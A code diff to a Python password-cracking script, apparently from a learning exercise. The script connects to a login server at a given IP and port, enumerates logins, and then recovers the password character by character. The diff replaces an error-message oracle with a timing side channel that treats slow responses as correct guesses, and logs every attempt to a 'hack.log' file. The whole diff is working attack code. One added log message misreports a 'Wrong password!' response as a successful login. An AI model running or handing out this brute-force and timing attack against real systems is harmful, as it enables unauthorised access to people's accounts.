@@ -2,10 +2,33 @@
 import json
 import socket
 import string
+import time
 from argparse import ArgumentParser, Namespace
 from itertools import product
 from typing import Any, Generator
 
+import logging
+
+
+def setup_logger(log_file: str = "hack.log") -> logging.Logger:
+    """Set up logger to write to file"""
+    logger = logging.getLogger(__name__)
+    logger.setLevel(logging.DEBUG)
+
+    # File handler
+    file_handler = logging.FileHandler(log_file)
+    file_handler.setLevel(logging.DEBUG)
+
+    # Formatter
+    formatter = logging.Formatter(
+        '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+    )
+    file_handler.setFormatter(formatter)
+
+    logger.addHandler(file_handler)
+    return logger
+
+logger = setup_logger()
 
 def parse_arguments() -> Namespace:
     """Parse command line arguments"""
@@ -51,6 +74,7 @@ def guess_login(client: socket.socket) -> str:
         response = client.recv(1024).decode()
         response_data = json.loads(response)
         if response_data.get("result") == "Wrong password!":
+            logger.debug(f"Login {login} was successful")
             return login
     return "not found"
 
@@ -62,24 +86,29 @@ def guess_password(client: socket.socket, login: str) -> str:
         for char in alphabet:
             attempt = ''.join(password) + char
             data = json.dumps({"login": login, "password": attempt})
+            logger.debug("Trying password: %s", attempt)
+            start_time = time.time()
             client.send(data.encode())
             response = client.recv(1024).decode()
             response_data = json.loads(response)
+            end_time = time.time()
+            elapsed_time = end_time - start_time
+            logger.debug("Response time: %.5f seconds", elapsed_time)
+            # Heuristic: if response time is significantly longer, we may be on the right track
             if response_data.get("result") == "Connection success!":
                 return attempt
-            elif response_data.get("result") == "Exception happened during login":
+            elif elapsed_time > 0.1:  # Adjust threshold as needed
                 password.append(char)
                 break
 
 
 def main():
     args = parse_arguments()
-    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client.connect((args.ip, args.port))
-    login = guess_login(client)
-    password = guess_password(client, login)
-    print(json.dumps({"login": login, "password": password}))
-    client.close()
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
+        client.connect((args.ip, args.port))
+        login = guess_login(client)
+        password = guess_password(client, login)
+        print(json.dumps({"login": login, "password": password}))
 
 
 if __name__ == "__main__":
